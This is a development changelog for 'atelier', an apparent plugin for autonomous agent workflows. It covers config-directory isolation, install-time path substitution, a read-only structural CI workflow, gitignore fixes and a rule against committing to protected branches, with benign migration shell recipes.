- `templates/settings.template.json` (the source) — hardcoded `~/.claude-work/*` Read entries are now `<atelier-config-dir>/*` placeholders. Substituted **once at install time** by `install.sh`, not at runtime by every consumer.

- `commands/next-task.md` step 7 — reads from `$CLAUDE_CONFIG_DIR/templates/settings.template.json` (the instantiated copy, accessible from inside the atelier session via the env var Claude Code itself reads). Sed substitutes only `<worktree>`. Five guards (pre-M5.0.2 simplicity). Hard refusals gain one entry forbidding reads from `$CLAUDE_PLUGIN_ROOT/templates/` (would pick up the source-with-placeholders copy).

- `commands/setup-project.md` — steps 3 and 8 reference `$ATELIER_CONFIG_DIR/projects.json` (default `~/.claude-work/projects.json`). Step 4 references `$ATELIER_CONFIG_DIR/templates/settings.template.json` (instantiated) and mentions only the `<worktree>` runtime placeholder.

- `HISTORY.md` M5.0 PR line backfilled `_pending_` → [#46](https://github.com/AkaLab-Tech/atelier/pull/46).

**Tests:**

- `bash -n` clean on modified `install.sh` and `scripts/atelier-setup-project`.
- `python3 -m json.tool` clean on `templates/settings.template.json`.
- Smoke test #1 (fresh tmpdir, no $ATELIER_CONFIG_DIR set): `atelier-setup-project --yes <project>` writes the registry to `$HOME/.claude-work/projects.json` (the default fallback) — verifies M5.0 behaviour didn't regress.
- Smoke test #2 (fresh tmpdir, `ATELIER_CONFIG_DIR=<custom>` set): `atelier-setup-project --yes <project>` writes the registry to `<custom>/projects.json` (the env var win) — verifies M5.0.2's parameterization.
- Smoke test #3 (collision, non-interactive): `install.sh --yes --config-dir <occupied>` exits non-zero with the actionable error message — verifies preflight refusal.
- Smoke test #4 (idempotent re-install): writing `.atelier-managed` marker into a config dir, then running preflight — passes without prompting.
- M1.7 structural CI workflow runs on this PR.

**Decisions captured:**

- **Install-time substitution of `<atelier-config-dir>`, NOT runtime.** First draft of this PR (commit `51c2c50`) substituted both `<worktree>` and `<atelier-config-dir>` at runtime, inside `commands/next-task.md` step 7 and `atelier-setup-project`'s `step_settings_json()`. Review feedback caught the design smell: `<atelier-config-dir>` is install-time (the operator decided where atelier lives at install — that doesn't change per-task / per-project), so making slash commands "know where atelier lives" mixed concerns. Final shape (commit `<this PR's second commit>`): install.sh substitutes `<atelier-config-dir>` once into `$ATELIER_CONFIG_DIR/templates/settings.template.json`; the consumers read THAT instantiated copy. Slash command specs no longer mention `<atelier-config-dir>` or env-var fallback chains — they just substitute the one remaining runtime placeholder, `<worktree>`.
- **Argparse via case-statement, not getopts.** Bash `getopts` doesn't natively support GNU-style `--long-options`. The hand-rolled while-case loop is ~25 lines and supports both `--config-dir <path>` and `--config-dir=<path>` forms.
- **Tilde-expansion is opt-in.** Operator-typed paths get `${path/#\~/$HOME}` expansion. Flag values and env vars do too. The bash native `~` expansion only happens at parse-time of unquoted tokens, so this manual expansion is required when the path comes through a quoted argument.
- **Marker file is JSON, not a touch file.** Could have been `touch $dir/.atelier-managed`. JSON makes it self-documenting (`jq . .atelier-managed` works) and lets future install.sh records add fields (e.g., last-install version) without breaking parse.
- **Marker refreshed on every install, not just on first install.** `installedAt` reflects the most recent install. That's the more useful question to answer for the operator ("when did atelier last touch this dir?") versus "when was it originally installed" (which they can pull from `git log` on their atelier checkout).
- **Instantiated templates live under `$ATELIER_CONFIG_DIR/templates/`, not `$CLAUDE_PLUGIN_ROOT/templates/`.** Mutating the plugin's own templates dir post-install would be weird — the plugin checkout is a git working tree managed by Claude Code's plugin updater. Writing to `$ATELIER_CONFIG_DIR/templates/` (atelier's instance config) keeps the source / instance separation clean. The plugin checkout stays pristine; the operator's instance has its own copy with install-time placeholders resolved.
- **Final summary print uses `sed "s|^$HOME|~|"`, not parameter-expansion `${CONFIG_FILE/#$HOME/~}`.** Both work, but the sed form survives the case where `$CONFIG_FILE` doesn't start with `$HOME` (e.g., operator set `ATELIER_CONFIG_DIR=/var/lib/atelier`), printing the full path instead of mangling.
- **No `commands/finish-task.md` / `commands/resume-task.md` / `commands/doctor.md` / `commands/status.md` changes in this PR.** They don't reference `~/.claude-work/` or the registry path today. If a future audit shows they do, that's a follow-up — for M5.0.2 the touch points are install.sh (preflight + instantiation), the bash helper, the template, and the two slash commands that DO substitute the template (`setup-project` via the helper, `next-task` step 7).

**Acceptance criterion status:** atelier handles config-dir collisions safely (preflight refuses, prompts, or proceeds idempotently depending on context) and all hardcoded paths now flow from a single `$ATELIER_CONFIG_DIR` variable. **Structurally satisfied** and **empirically validated** by the four smoke tests above.

**Follow-ups (unchanged from M5.0 entry):**

- M5.0.1 — gh auth isolation via `GH_CONFIG_DIR` + atelier-bot identity. Now reads `$ATELIER_CONFIG_DIR/gh/` cleanly thanks to this milestone's parameterization.
- M5.0.3 — `atelier-uninstall` with chat-session preservation. Will read `$ATELIER_CONFIG_DIR` from the shellrc hook block to know what to clean / preserve.
- Hardening of install.sh shellrc hook re-injection. install.sh skips the shellrc edit if the sentinel comment is already present — same issue noted in M5.0 entry; a future installer could detect drift and offer to refresh.

### M5.0 — Config root isolation: atelier lives under `~/.claude-work/` — 2026-05-21
**PR:** [#46](https://github.com/AkaLab-Tech/atelier/pull/46)

Until M5.0, atelier shared the operator's primary Claude config directory (`~/.claude/` by default, or `~/.claude-personal/` when the operator used `CLAUDE_CONFIG_DIR` to separate accounts). That co-location had two costs:

1. **Rule conflicts.** The operator's personal `~/.claude/CLAUDE.md` may say things like *"never push without confirmation"* — appropriate for their personal sessions but actively hostile to atelier's autonomous flow (`pr-author` *must* push to `task/*` without prompting). The conflict was patched at the per-task settings layer (`settings.template.json`'s allow list), but the rule-vs-rule choreography was fragile.
2. **Plugin pollution.** atelier's plugin install (`atelier@akalab-tech` + `claude-roadmap-tools@akalab-tech`) landed under the operator's main config dir's `plugins/`, mixing with whatever else the operator had installed there.

M5.0 moves atelier to its own isolated config directory: **`~/.claude-work/`**. Auth tokens, plugin installs, memory, sessions — everything atelier touches at the config-dir level lives there, separate from the operator's personal Claude.

**Delivered:**

- `install.sh`:
  - **Top of script (after `set -euo pipefail`)** — `export CLAUDE_CONFIG_DIR="${HOME}/.claude-work"`. Every `claude` invocation in install.sh inherits this: Phase B auth (`claude auth status` / `claude auth login`), Phase C.2 marketplace + plugin install (`claude plugin marketplace add`, `claude plugin install`). Wrapped via export rather than per-call prefix because there are ~6 spots inside Phase B/C.2 and per-call wrapping invites drift.
  - **New `phase_c_1_claude_config_dir()` function** — `mkdir -p ~/.claude-work/` (idempotent). Wired into `phase_c_1()` as the first sub-step so the directory exists before any `claude` invocation runs.
  - **`task()` function in shellrc hook block** — now reads `task() { CLAUDE_CONFIG_DIR="$HOME/.claude-work" claude "/next-task $*"; }`. Without the inline prefix, the operator's interactive `task` invocation would open `claude` under whatever `CLAUDE_CONFIG_DIR` is in their shell environment (often unset / personal), which would NOT have atelier installed and would fail with `/atelier:next-task` unknown.

- `scripts/atelier-setup-project`:
  - **`CONFIG_FILE` path** changed from `${HOME}/.claude/.atelier-config.json` to `${HOME}/.claude-work/projects.json`. The file shape is unchanged (the `projects` JSON object); only the path moved.
  - **Plugin auto-discover path** changed from `$HOME/.claude/plugins/*/atelier/` to `$HOME/.claude-work/plugins/*/atelier/`. Inline comment + `--help` output + the actionable error message all updated.
  - **Final summary print** changed from `~/.claude/.atelier-config.json: $CONFIG_STATUS` to `~/.claude-work/projects.json: $CONFIG_STATUS`.

- `templates/settings.template.json` — allow-list entries updated:
  - `Read(~/.claude/settings.json)` → `Read(~/.claude-work/settings.json)`
  - `Read(~/.claude/.atelier-config.json)` → `Read(~/.claude-work/projects.json)`

- `commands/setup-project.md` (the slash command spec / wrapper docs) — references to `~/.claude/.atelier-config.json` updated to `~/.claude-work/projects.json` in steps 3 and 8 of the inline contract description.

**Tests:**

- `bash -n` clean on the modified `install.sh` and `scripts/atelier-setup-project`.
- `python3 -m json.tool` clean on the modified `templates/settings.template.json`.
- Smoke test of `atelier-setup-project --yes <fresh-dir>` under an isolated `$HOME`: helper writes the registry to `$HOME/.claude-work/projects.json` (new path), nothing at `$HOME/.claude/.atelier-config.json` (old path). The final-summary line now reads `~/.claude-work/projects.json: created` instead of `~/.claude/.atelier-config.json: created`. Confirmed empirically.
- The M1.7 structural CI workflow (added in [#45](https://github.com/AkaLab-Tech/atelier/pull/45)) runs on this PR and validates: shell syntax, JSON validity, YAML frontmatter, helper `--help` smoke.

**Decisions captured:**

- **Single export at the top of install.sh, not per-call.** The script has ~6 `claude ...` invocations inside Phase B and C.2. Wrapping each with `CLAUDE_CONFIG_DIR=... claude ...` is correct but invites silent drift when a new invocation is added. The export at script load is one line, one place to forget, and child processes inherit naturally.
- **Inline `CLAUDE_CONFIG_DIR=` prefix in `task()`, NOT export.** The shellrc hook block runs in the operator's interactive shell. Adding `export CLAUDE_CONFIG_DIR=~/.claude-work` at top-of-block would pollute every command the operator runs in that shell with atelier's config dir — including plain `claude` invocations the operator wants to use for personal work. The inline prefix on `task()` scopes the env var to just that one function call.
- **`~/.claude-work/` chosen, not `~/.claude-atelier/` or `~/.atelier/`.** The operator already had a `~/.claude-work/` directory in use (held their employer-account Claude session). That directory was renamed to `~/.claude-hbops/` before this milestone (a one-time housekeeping operation the operator performed manually). `~/.claude-work/` is now exclusively atelier's. The naming contrasts well with the operator's `~/.claude-personal/`: "personal Claude" vs "work Claude / atelier mode".
- **Registry shape unchanged.** The file at the new path keeps the exact `{ "projects": { "<abs-path>": { "setupCompleted": ..., "setupVersion": ... } } }` shape from M4.9. Only the file's filesystem location moved. The migration recipe below is a single `mv`.
- **No GH auth isolation in this milestone.** Captured as **M5.0.1** follow-up. `gh` has `GH_CONFIG_DIR` env var support (mirror of `CLAUDE_CONFIG_DIR`). Isolating gh auth means a separate `gh auth login` for an atelier-bot identity — operational decision the operator may or may not want.

**Migration for pre-M5.0 operators** (anyone who previously ran `atelier-setup-project` and has the registry at `~/.claude/.atelier-config.json` plus the plugin installed under `~/.claude/plugins/`):

```sh
# 1. Create the new config root if it does not exist
mkdir -p ~/.claude-work

# 2. Move the registry (shape unchanged — just rename the file)
[ -f ~/.claude/.atelier-config.json ] && \
  mv ~/.claude/.atelier-config.json ~/.claude-work/projects.json

# 3. Remove the existing atelier shellrc hook block so install.sh can
#    re-inject the M5.0 version (with CLAUDE_CONFIG_DIR=~/.claude-work
#    on task())
sed -i.pre-m5.0 '/# >>> atelier hooks/,/# <<< atelier hooks/d' ~/.zshrc

# 4. Re-run install.sh from the atelier checkout. With CLAUDE_CONFIG_DIR
#    exported at the top, Phase B re-authenticates atelier under
#    ~/.claude-work/ (the operator may be prompted to log in fresh —
#    that one-time pain is expected), and Phase C.2 installs the atelier
#    marketplace + plugins under ~/.claude-work/plugins/.
bash ~/path/to/atelier-checkout/install.sh

# 5. Optionally: uninstall atelier from the old config dir to keep the
#    two Claude installs cleanly separate. Run WITHOUT CLAUDE_CONFIG_DIR
#    set so the uninstall targets the operator's personal config:
unset CLAUDE_CONFIG_DIR
claude plugin uninstall atelier@akalab-tech
claude plugin uninstall claude-roadmap-tools@akalab-tech
```

Step 3 (`sed -i.pre-m5.0`) keeps a backup of the pre-edit `~/.zshrc` as `~/.zshrc.pre-m5.0`. Operator can `mv ~/.zshrc.pre-m5.0 ~/.zshrc` to revert if anything goes wrong.

**Acceptance criterion status:** the rule-conflict + plugin-pollution costs are structurally eliminated:

- `task` from a normal shell opens Claude under `~/.claude-work/`, with atelier's own rules.
- `atelier-setup-project` writes the registry to `~/.claude-work/projects.json`, no longer co-located with personal Claude state.
- `install.sh` re-run installs the atelier plugin into `~/.claude-work/plugins/`.

**Structurally satisfied** + **empirically validated** by the `atelier-setup-project` smoke test under isolated `$HOME`. End-to-end validation of `install.sh` from scratch (a fresh-Mac re-install) is deferred — the next time an operator bootstraps from scratch is the natural validation moment.

**Follow-ups:**

- **M5.0.1** — gh auth isolation. `gh` respects `GH_CONFIG_DIR` (mirror of `CLAUDE_CONFIG_DIR`). install.sh Phase B could set `GH_CONFIG_DIR=~/.claude-work/gh` so atelier's `gh auth login` lands separate from the operator's personal gh auth. Requires a separate GitHub identity (bot account) for atelier — which fixes Finding #11 (same-identity self-approval) at the same time. Recommended as a paired pair.
- **M5.1** — extend the registry schema with `name` and `lastTask` fields (originally planned per ROADMAP). The path component of M5.1 is now done by this M5.0 milestone; only the schema extension remains.
- **Hardening of install.sh shellrc hook re-injection.** Today, install.sh skips the shellrc edit if the sentinel is already present — a re-run after a code change to the hook block does NOT pick up the new version. The migration recipe above works around this manually. A future install.sh could detect drift and offer to refresh.

### M1.7 — Self-CI for atelier (structural validations only) — 2026-05-21
**PR:** [#45](https://github.com/AkaLab-Tech/atelier/pull/45)

Atelier's own development had zero CI: PRs to this repo (M4.6 → M4.13) relied on manual review plus the "Tests:" section in each HISTORY entry. That worked for the single-maintainer case but missed simple structural defects more than once — most notably the `bash` heredoc-in-cmdsub typo caught at the last minute during M4.9 implementation. M1.7 closes the gap with a minimal GitHub Actions workflow that runs four structural checks on every PR against `main` (and on push to `main`).

**Delivered:**

- `.github/workflows/structural.yml` (NEW, 66 lines) — single workflow file, single job, four steps:
  1. **bash -n on shell scripts.** Iterates over `install.sh` and every file in `scripts/*`. Emits `::error file=<path>::shell syntax error` annotations on failure so GitHub surfaces them inline in the PR review UI.
  2. **python3 -m json.tool on JSON files.** `find . -type f -name '*.json' -not -path './node_modules/*' -not -path './.git/*'` — catches every JSON in the repo, including `templates/settings.template.json`, `.claude-plugin/plugin.json`, `hooks/hooks.json`, `hooks/patterns/*.json`, and the worktree's own `.claude/settings.json`.
  3. **YAML frontmatter parse on `agents/*.md` / `commands/*.md` / `skills/*/SKILL.md`.** Ruby is used (built-in `yaml` stdlib on `ubuntu-latest`; no extra installs needed) to extract the `^---\n.*?\n---` block and `YAML.safe_load` it. Catches any frontmatter that Claude Code would silently reject at plugin-load time.
  4. **`scripts/atelier-setup-project --help` exit 0.** Minimal smoke that the bash helper binary still loads after any change.

- Triggers: `pull_request` against `main` (the primary use case) plus `push` to `main` (defensive — catches a stale-base PR slipping through after merge).
- Permissions: `contents: read` only. The workflow is read-only by design.
- Timeout: 2 minutes (well above the 30-second target; the local equivalent runs in <2 s on the maintainer's laptop).

**Tests:**

- `ruby -ryaml` parse on `.github/workflows/structural.yml` itself confirms valid YAML before commit. 66 lines (target was <80).
- The full local equivalent of the workflow (the same 4 checks run by hand) ran clean on `main` at commit `12855c4`: 31/31 checks passed (2 shell scripts, 8 JSON files, 20 agents/commands/skills, 1 helper smoke). That run is the empirical baseline this workflow codifies.
- **The PR opening this milestone is the workflow's own first run.** A clean PR demonstrates the happy path; a deliberately-broken follow-up PR (one of the acceptance scenarios — unbalanced quote in `install.sh`, invalid JSON, malformed frontmatter) is left for future verification when the next operator opens such a PR by accident.

**Decisions captured:**

- **Triggers on both `pull_request` and `push` to main.** Pull-request alone would miss the case where a PR is opened against a stale `main` and then `main` advances before the merge: the merge commit on `main` might contain a combination that no PR's workflow ever validated. Adding `push: branches: [main]` is one extra run per merge — cheap insurance.
- **Ruby for the YAML check.** Considered Python with `pip install pyyaml` (more familiar in CI). Rejected — ruby ships with `yaml` in its stdlib on `ubuntu-latest`, so no install step, no caching needed, no network call. One less moving part.
- **`::error file=…::` annotations.** GitHub renders these as in-line file annotations on the PR's "Files changed" tab. A failure that says only "JSON parse failed" wastes the reviewer's time finding which JSON; the explicit file pointer goes straight to the offending file.
- **No `find -type f -name "*.md"` over the whole tree for frontmatter.** Bounded the YAML check to `agents/`, `commands/`, `skills/*/SKILL.md` because: (a) those are the files Claude Code actually parses for plugin frontmatter; (b) other `.md` files (`README`, `PLAN`, `HISTORY`, `ROADMAP`) may legitimately contain `---` lines mid-document as section breaks, and a global find would false-positive on them.
- **No behavioural / end-to-end tests in this milestone.** Per the ROADMAP entry's "Out of scope" — agent-chain runs, `claude` CLI authenticated in CI, dogfood automation all depend on infrastructure that does not exist yet and would balloon M1.7's scope. Those land in M3.x.
- **Workflow is operator/maintainer-managed only.** The agent permission template (`templates/settings.template.json`) already denies `Edit(.github/workflows/**)` and `Write(.github/workflows/**)` — once this workflow exists, future agent-led PRs cannot modify it. The maintainer (this PR's author) is the only allowed editor by design.

**Acceptance criterion status:** the ROADMAP M1.7 acceptance — *"opening a PR against `main` with a deliberately broken `install.sh`, an invalid `templates/settings.template.json`, or a malformed YAML frontmatter fails the workflow with a clear error pointing at the offending file. A clean PR passes within 30 seconds."* — is **structurally satisfied** (the workflow exists and runs the right checks) and **partially empirically validated** (the happy path on this PR's clean commits demonstrates the green case; the broken-input cases are deferred to future PRs that accidentally introduce defects).

**Follow-ups (not in scope here):**

- M3.x will add behavioural / end-to-end CI as part of the `auto-merge` + `reviewer` workflow (separate concerns from structural validations).
- A future maintainer could extend `structural.yml` with: shellcheck (stricter than `bash -n`), markdownlint, a JSON-schema check on the hooks pattern files, or a `claude plugin validate` command if/when one ships. All explicit non-goals for M1.7.

### M4.13 — Strip atelier-internal references from operator-rules.md — 2026-05-21
**PR:** [#44](https://github.com/AkaLab-Tech/atelier/pull/44)

[M4.12](#m412--codify-no-commits-to-protected-branches--fix-m410-migration-recipe--2026-05-20) shipped operator-rules.md with the line *"**No exceptions for 'throwaway' target projects:** atelier's own dogfood repos have already produced one violation of this rule (HISTORY → M4.12); the bar is the same everywhere."* That sentence leaks atelier-internal concepts — `dogfood`, references to atelier's own dev infrastructure — into a file that the `SessionStart` hook loads into **every target-project session**. The agent reading operator-rules.md in a managed project doesn't need to know — and shouldn't be told — about atelier's internal test rigs.

A first draft of M4.13 made this worse: it added a "Scope: when this rule does NOT apply" sub-section that explicitly named `atelier-dogfood-N`, smoke-test harnesses, and other atelier-internal labels. The operator immediately pushed back — that whole section had no business in operator-facing rules.

M4.13 (this version) takes the simpler approach: **strip all atelier-internal references from operator-rules.md**. The rule stays universal: *"Never commit to protected branches."* Whether the maintainer commits directly to main when bootstrapping atelier's own throwaway test rigs is a personal call that doesn't need to be codified in the rules every other session reads.

**Delivered:**

- `operator-rules.md` "Never commit to protected branches" sub-section, simplified:
  - Opening sentence: dropped *"including in **target projects** atelier manages, where the operator may be the sole contributor and skipping the PR loop for a one-line fix looks tempting"* — meta-phrasing that was self-referential from the agent's POV. Replaced with the bare rule.
  - Removed M4.12's *"**No exceptions for 'throwaway' target projects**..."* sentence — atelier-internal leakage.
  - Did **not** add the "Scope: when this rule does NOT apply" sub-section that this milestone's first draft proposed (the carve-out itself was atelier-internal leakage).
  - Final shape: rule statement → four branch-name conventions → "no exceptions for team-size" reasoning → permission-model note + future-hook pointer. No `dogfood`, no `test rig`, no `gestionado`, no `atelier-dogfood-N`. Generic English.

- `HISTORY.md` M4.12 entry — inline annotation at the top of "Delivered" updated to explain the M4.12 framing both over-reached *and* leaked atelier-internal concepts, and points forward to this entry. The rest of M4.12 is preserved as the audit trail.

- `HISTORY.md` M4.12 PR line — backfill `_pending_` to [#43](https://github.com/AkaLab-Tech/atelier/pull/43) (merged).

**Tests:**

- No code changes — pure rules cleanup.
- The cleaned operator-rules.md was reviewed for any remaining atelier-internal references: no `dogfood`, no `dogfood-N`, no `atelier-dogfood`, no `smoke-test`, no `throwaway`, no `test rig`, no `gestionado` jargon. All English, all generic.

**Decisions captured:**

- **The carve-out is NOT codified anywhere atelier loads into agent sessions.** The maintainer's discretion about *"when can I commit-to-main on my own throwaway test repo"* lives in atelier dev docs (this HISTORY entry, future maintainer-only notes) — not in operator-rules.md, not in any agent-facing CLAUDE.md, not in PLAN.md §3's permissions matrix. Even mentioning "this exception exists" in operator-facing files would re-leak the same atelier-internal context this milestone is trying to strip.
- **Inline annotation on M4.12, not a "superseded" mark.** Same reasoning as before — HISTORY is mostly append-only, but a reader who lands on M4.12's framing should see the correction inline.
- **No "Scope" or "Exceptions" section in operator-rules.md, period.** Considered keeping a generic version ("the rule has narrow exceptions; ask if unsure"). Rejected — that invites edge-case lawyering. Bare rule is clearer.
- **No PreToolUse hook in this milestone.** Inherited from M4.12 — a future hook lands separately and would read the (now clean) rule.

**Acceptance criterion status:** operator-rules.md no longer references any atelier-internal infrastructure. The rule is clean, universal, and audience-appropriate (every session that loads it sees a coherent constraint with no internal jargon). **Structurally satisfied.**

**Follow-ups (not in scope here):**

- Same `/atelier:doctor` and PreToolUse hook ideas as M4.12. Both should be designed without reference to specific test-rig names — the rule is universal, regardless of who's running it.
- A general sweep of other prompt files (`CLAUDE.md`, agent prompts, command specs) for similar "atelier-internal leakage" — same pattern as M4.10/M4.12's "we should sweep this for similar issues" but specifically about *what concepts the agent should know about*, not just about commit hygiene.

### M4.12 — Codify "no commits to protected branches" + fix M4.10 migration recipe — 2026-05-20
**PR:** [#43](https://github.com/AkaLab-Tech/atelier/pull/43)

Atelier shipped [M4.10](#m410--gitignore-claudesettingsjson-in-atelier-setup-project--2026-05-20) with a documented migration recipe that ran `git commit` directly on `main` (no branch, no PR). When the maintainer executed that recipe on the dogfood-3 repo the day M4.10 merged, they noticed the violation against the operator's global CLAUDE.md rule ("NUNCA realices un commit en ramas protegidas") — and realized atelier's own operator-facing rules never stated this principle explicitly. The permission template only blocks **pushes** to `main` / `master` / `develop` / `staging` (`Bash(git push * main)`); the commit-level rule was carried implicitly by `/next-task`'s branching flow, but had no force outside that flow.

M4.12 closes the gap.

**Delivered:**

> ⚠️ *[**Refined by [M4.13](#m413--strip-atelier-internal-references-from-operator-rulesmd--2026-05-21)**: the "no exception applies to throwaway target projects" framing below leaked atelier-internal concepts (dogfood-N, atelier's own dev infrastructure) into operator-rules.md, which the `SessionStart` hook loads into every target-project session. M4.13 strips that leakage — operator-rules.md now states the rule cleanly with no atelier-internal references. The rest of this M4.12 entry is preserved as the audit trail of what we thought at the time.]*

- [operator-rules.md](operator-rules.md) — new sub-section "### Never commit to protected branches" under §"Push, PR, and merge gates", placed before "### Before pushing". States the rule explicitly, lists the four branch-name conventions (`task/<id>-<slug>`, `chore/<short>`, `docs/<topic>`, `fix/<short>`), notes that **no exception applies to throwaway target projects**, and references the permission-model push-block as the layered defence. Closes with a forward-pointer to a future `PreToolUse` hook that could enforce this at commit time.

- [HISTORY.md](HISTORY.md) M4.10 entry — migration recipe rewritten to use a `chore/atelier-m4.10-migration` branch + PR flow. A "Note (added retroactively by M4.12)" annotation explains why the recipe changed and links to operator-rules.md.

- This HISTORY entry — documents the surfacing event, the fix shape, and the related dogfood-3 [PR #1](https://github.com/AkaLab-Tech/atelier-dogfood-3/pull/1) which is the corrected execution of the M4.10 migration on dogfood-3.

**Tests:**

- No code changes — pure doc + rule additions.
- The corrected migration recipe is being executed in [dogfood-3 PR #1](https://github.com/AkaLab-Tech/atelier-dogfood-3/pull/1) and serves as the empirical demonstration that the new recipe works.

**Decisions captured:**

- **Codify the rule, don't (yet) enforce it.** Considered adding a `PreToolUse` hook on `Bash(git commit*)` that aborts when `git symbolic-ref HEAD` resolves to a protected branch. Decided to start with a prompt-level rule for two reasons: (a) the hook infrastructure isn't materialized yet (see PLAN.md §1 — hooks are planned but not built), and (b) one violation in the dogfood-3 day is a small enough signal to validate the prompt-level approach first. A follow-up milestone will track the hook idea if the rule alone proves insufficient.
- **Update the M4.10 entry in-place rather than appending a "correction" entry.** HISTORY is normally append-only, but a documented recipe that the reader is meant to copy-paste must be correct at the point of reading. Both options were considered; chose in-place fix plus an inline retro-note that points at this M4.12 entry, so the audit trail (what was wrong, who fixed it, when) is preserved.
- **No M-number for the dogfood-3 PR #1.** The cleanup of dogfood-3 itself is operational, not a milestone — it's the execution of the M4.10 migration, not a deliverable. The atelier-side fix is M4.12; the target-project work is just a chore PR.
- **No exception for throwaway target projects.** Considered carving out "OK to commit to `main` directly on dogfood/throwaway repos". Decided against: every "throwaway" repo eventually outlives its planned lifetime, every operator who learns the wrong pattern once will reach for it again, and the audit-trail value of a PR is independent of who's reviewing.

**Acceptance criterion status:** the rule is codified; the broken recipe is fixed; the dogfood-3 violation is being remedied through the corrected recipe in a separate PR. **Structurally satisfied.**

**Follow-ups (not in scope here):**

- A `PreToolUse` hook that enforces this at commit time (a small piece of M4.x or M5.x territory, after the hook infrastructure lands).
- A `/atelier:doctor` check that fails when the user is currently on `main` / `master` / `develop` / `staging` in a project under atelier's management.
- Reviewing all other documented recipes in atelier (CLAUDE.md, agent prompts, command specs) to ensure none of them prescribe a direct `git commit` on a protected branch. This M4.12 PR touched only the M4.10 recipe; a sweep is worth doing once.

### M4.10 — Gitignore `.claude/settings.json` in `atelier-setup-project` — 2026-05-20
**PR:** [#42](https://github.com/AkaLab-Tech/atelier/pull/42)

Fix for the dogfood-3 Finding D3-3 captured in PR [#41](https://github.com/AkaLab-Tech/atelier/pull/41). The bash helper substitutes `<worktree>` with the operator's absolute path when it writes `<project>/.claude/settings.json`, so that file is **per-operator** and must not be committed. The helper's `step_gitignore` was only listing `.task-log/`, `.claude/settings.local.json`, and `.DS_Store` — `settings.json` itself was missing, which is exactly how dogfood-3's initial commit baked `/Users/mike/Work/atelier-dogfood-3` into the version-controlled file.

**Delivered:**

- [scripts/atelier-setup-project](scripts/atelier-setup-project) step 7: one-element addition to the `needed` array — `.claude/settings.json` slotted between `.task-log/` and `.claude/settings.local.json`. Inline comment captures the *why* (per-operator absolute path) and links to the dogfood-3 D3-3 finding so a future reader can see the historical pretext without digging through git blame.
- [commands/setup-project.md](commands/setup-project.md) §7: the four-entry list now reads `.task-log/`, `.claude/settings.json`, `.claude/settings.local.json`, `.DS_Store`, plus a one-sentence note that `settings.json` is gitignored because it has the operator's absolute path baked in.

The fix is **idempotent** by design: `step_gitignore` already short-circuits when all `needed` entries are present, and appends only the truly-missing ones under a clearly-marked atelier section when the file pre-exists. Re-running the helper on a project bootstrapped pre-M4.10 will correctly append `.claude/settings.json` without duplicating the other three entries.

**Tests:**

- `bash -n` clean on the modified script.
- Smoke test in a tmpdir with isolated `$HOME`: `atelier-setup-project --yes <fresh-dir>` produces `.gitignore` with all four lines. Re-running is a no-op (`.gitignore: preserved`). Running on a project where `.gitignore` pre-exists with the three old entries appends only the new `.claude/settings.json` line under the atelier section. Running on a project where `.gitignore` already has all four entries reports `preserved` and makes no edit.

**Decisions captured:**

- **Add the inline comment + the "why" in the slash command spec, not just the bash array.** The reason for gitignoring `.claude/settings.json` is non-obvious (it's a peer of `settings.local.json`; most setups gitignore *only* the `.local.json` variant). The comment is the artifact that prevents a future maintainer from "simplifying" the array back to three entries without realizing why the fourth one exists.
- **No version bump in `.claude-plugin/plugin.json`.** Pre-1.0, the plugin's recorded `setupVersion` advances together with `plugin.json`'s `version` field. We are not bumping for every fix — the change is tracked through `HISTORY.md`, which is the canonical source. A bump can ride the next user-visible feature change.
- **No migration code in the script.** Projects bootstrapped pre-M4.10 keep a tracked-but-mispathed `settings.json` until the operator runs `git rm --cached .claude/settings.json` (preserving the local file). Auto-detecting and silently removing a tracked file would be too magical for a setup helper. The migration steps are documented in the M4.10 ROADMAP entry (now removed from ROADMAP by this PR — preserved in this HISTORY entry's "Migration" line below).

**Migration for projects bootstrapped pre-M4.10** (corrected by [M4.12](#m412--codify-no-commits-to-protected-branches--fix-m410-migration-recipe--2026-05-20) to honour the never-commit-to-protected-branches rule):

```sh
git checkout -b chore/atelier-m4.10-migration
git rm --cached .claude/settings.json
echo '.claude/settings.json' >> .gitignore   # only if not already present
git commit -m "chore: untrack .claude/settings.json (per atelier M4.10)"
git push -u origin chore/atelier-m4.10-migration
gh pr create --title "chore: untrack .claude/settings.json (per atelier M4.10)" --fill
# review, then squash-merge via `gh pr merge` (or the project's normal flow)
```

The operator's local `.claude/settings.json` is preserved (`git rm --cached` only updates the index). The dogfood-3 GitHub repo needs this before any dogfood-4 attempt, and is documented as the next housekeeping step after M4.10 lands.

**Note (added retroactively by M4.12):** the original version of this recipe ran `git commit` directly on `main` without a branch + PR loop, which violates the rule now codified in [operator-rules.md → "Never commit to protected branches"](operator-rules.md). When the maintainer executed this recipe on the dogfood-3 repo the day M4.10 shipped, the violation surfaced immediately. M4.12 corrects the recipe here and adds the rule explicitly to operator-rules.md.

**Acceptance criterion status:** the ROADMAP M4.10 acceptance — *"running `atelier-setup-project <fresh-dir>` produces a `.gitignore` that includes `.claude/settings.json`"* — is **structurally satisfied** and **empirically validated** by the tmpdir smoke test above.

**Follow-ups:**

- M4.11 — investigate the M4.7 thesis under `claude --plugin-dir` mode (the blocking D3-2 from dogfood-3). Independent of M4.10.
- Pre-dogfood-4 housekeeping: cleanup commit on `atelier-dogfood-3` to untrack its pre-existing `.claude/settings.json` per the migration steps above.

### Dogfood-3 (blocked at `/next-task` step 7) — 2026-05-20
**PR:** [#41](https://github.com/AkaLab-Tech/atelier/pull/41)

Third dogfood run on a real GitHub repo ([`AkaLab-Tech/atelier-dogfood-3`](https://github.com/AkaLab-Tech/atelier-dogfood-3), private). Designed to validate **M4.6 + M4.7 + M4.8 + M4.9 end-to-end together** via two tasks: (#1) happy path adding `src/greet.ts` + matching vitest, (#2) forced-failure bumping `package.json` version to exercise the deny-list + `retry-with-logs` → `unblocker` loop.

**Result: blocked before the agent chain ran.** `/next-task` died at step 7 (per-task `.claude/settings.json` instantiation) on the first task. Three findings — one already known, two new:

**D3-1 (known): `claude --plugin-dir` does not export `$CLAUDE_PLUGIN_ROOT`.** Already captured in PR [#39](https://github.com/AkaLab-Tech/atelier/pull/39#issuecomment-4501626480)'s M4.9 empirical comment. Workaround: explicit `CLAUDE_PLUGIN_ROOT=/abs/path/to/atelier claude -p ...`. Applied here. `/next-task` step 7's sed command (`"$CLAUDE_PLUGIN_ROOT/templates/..."`) has the same vulnerability — the workaround is required for *any* slash command that references the var, not just `/setup-project`.

